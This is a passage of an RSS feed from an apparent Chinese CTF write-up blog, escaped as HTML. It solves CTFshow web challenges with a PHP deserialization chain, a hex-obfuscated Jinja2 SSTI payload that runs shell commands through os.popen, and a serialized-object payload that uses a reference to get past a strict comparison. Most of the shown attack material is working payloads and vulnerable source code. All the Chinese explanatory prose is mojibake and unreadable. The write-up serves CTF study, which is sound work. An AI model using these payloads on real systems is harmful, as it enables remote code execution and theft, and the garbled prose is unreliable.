&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">())));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>getæ–¹å¼ä¼ å…¥ï¼ŒåŒæ—¶vpsä¸Šå¼€ä¸€ä¸ªftp-serverå’Œä¸€ä¸ªç›‘å¬åå¼¹shellçš„ç«¯å£ï¼Œå³å¯æ‹¿flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116141329800.png" alt="image-20211116141329800">&lt;/p>
&lt;h2 id="magicmail">MagicMail&lt;/h2>
&lt;p>åŸé¢˜ï¼Œsstiå¥—å£³ï¼Œå‚è§-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/#webmega-mailer">[DeconstruCTF 2021]Mega Mailer&lt;/a>ï¼Œä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡å‡ºï¼Œæ˜¯æˆ‘çš„é—®é¢˜ï¼Œå¹³æ—¶æ‹¿ç°æˆçš„payloadæ¢­æƒ¯äº†ï¼Œè‡ªå·±æ„é€ çš„æ—¶å€™å°±éœ²äº†æ€¯&lt;/p>
&lt;p>payloadçš„æ„é€ å‚è§-&amp;gt;&lt;a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">Jinja2 SSTI filter bypasses&lt;/a>ï¼Œä½¿ç”¨&lt;code>attr()&lt;/code>+hexå­—ç¬¦ä¸²çš„æ–¹å¼æŠŠåŸºç¡€payloadç»™æ‹¼å‡ºæ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>sender=&amp;amp;receiver=&amp;amp;subject=&amp;amp;message={{()|attr(&amp;quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&amp;quot;)()|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(180)|attr(&amp;quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(&amp;quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(&amp;quot;\x65\x76\x61\x6c&amp;quot;)(&amp;quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x27\x29\x2e\x72\x65\x61\x64\x28\x29&amp;quot;)}}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># åŸæœ¬çš„æ ·å­&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">subclasses&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">180&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag&amp;#39;).read()&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>CTFshow1121å‡»å‰‘æ¯ Wp</title><link>https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/</link><pubDate>Tue, 16 Nov 2021 03:00:57 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/</guid><description>&lt;h2 id="ç»™æˆ‘çœ‹çœ‹">ç»™æˆ‘çœ‹çœ‹&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type: text/html;charset=utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$your_answer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$useless&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshowç¬¬ä¸€æ·±æƒ…&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">your_answer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;Only you know&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">useless&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;I_love_u&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">$you_never_know&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$you_never_know&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">your_answer&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;s&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;ç»™æˆ‘çœ‹çœ‹!&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;ç»™æˆ‘çœ‹çœ‹!&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;script&amp;gt;window.alert(&amp;#39;è¿™æ˜¯ä¸èƒ½è¯´çš„ç§˜å¯†&amp;#39;);location.href=&amp;#39;https://www.bilibili.com/video/BV1CW411g7UF&amp;#39;;&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¯å‡ ä¸ªå°trickçš„åˆé›†ï¼Œä¸éš¾&lt;/p>
&lt;ul>
&lt;li>&lt;code>extract()&lt;/code>å¯ä»¥å˜é‡è¦†ç›–&lt;/li>
&lt;li>&lt;code>$this-&amp;gt;your_answer === $this-&amp;gt;name&lt;/code>è¿™æ ·çš„å¼ºæ¯”è¾ƒå¯ä»¥ç”¨æŒ‡é’ˆå–åœ°å€æ–¹å¼ç»•è¿‡&lt;/li>
&lt;/ul>
&lt;p>exp&lt;/p>
&lt;pre tabindex="0">&lt;code>$test = new whoami();
$test-&amp;gt;your_answer=&amp;amp;$test-&amp;gt;name;
echo serialize($test);
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?s=%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B%21
POST: secret=O%3A6%3A%22whoami%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A19%3A%22ctfshow%E7%AC%AC%E4%B8%80%E6%B7%B1%E6%83%85%22%3Bs%3A11%3A%22your%5Fanswer%22%3BR%3A2%3Bs%3A7%3A%22useless%22%3Bs%3A8%3A%22I%5Flove%5Fu%22%3B%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211111233756111.png" alt="image-20211111233756111">&lt;/p>
&lt;h2 id="è°æ˜¯ctfä¹‹ç‹">è°æ˜¯ctfä¹‹ç‹ï¼Ÿ&lt;/h2>
&lt;blockquote>
&lt;p>æ®è¯´è¾“å…¥æ¡†èƒ½è¿èµ·æ¥çš„&lt;/p>
&lt;/blockquote>
&lt;p>f12å¯ä»¥çœ‹åˆ°æç¤º/ssti.html&lt;/p>
&lt;p>ç„¶åæ²¡å•¥å¯è¯´çš„ï¼ŒåŸé¢˜ï¼Œä¸€ç‚¹éƒ½æ²¡æ”¹ï¼Œç›´æ¥çœ‹ä¹‹å‰çš„åšå®¢-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[DigitalOverdoseCTF 2021]madlib&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211111235757667.png" alt="image-20211111235757667">&lt;/p>
&lt;p>yysyï¼Œçœ‹åˆ°è¿™ä¸ªhintæˆ‘å°±å·²ç»æ„è¯†åˆ°æ˜¯åœ¨è€ƒè¿™ä¸ªé¢˜äº†ï¼Œæœç„¶ï¼Œæ²¡æ‹¿ä¸Šä¸€è¡€å¯æƒœäº†&lt;/p>
&lt;h2 id="easypop">easypop&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$fun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$wo&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">fun&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">fun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;é˜¿ç¥–æ”¶æ‰‹å§ï¼Œå¤–é¢æœ‰å¥—ç¥&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$p&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">getFlag&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshow&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshow&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$wo&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">phpinfo&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpç‰ˆæœ¬7.3å“¦ï¼Œæ²¡æœ‰äººå¯ä»¥å†ç»•è¿‡æˆ‘äº†&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$function&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$function&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$ran&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$rce&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;é€ç»™ä½ äº†&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$rce&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/action_2/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">get_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;å•¥ä¹Ÿæ²¡æœ‰&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$jia&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__invoke&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pop&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$pop&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pop&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pop&lt;/span>&lt;span style="color:#111">);&lt;/span>
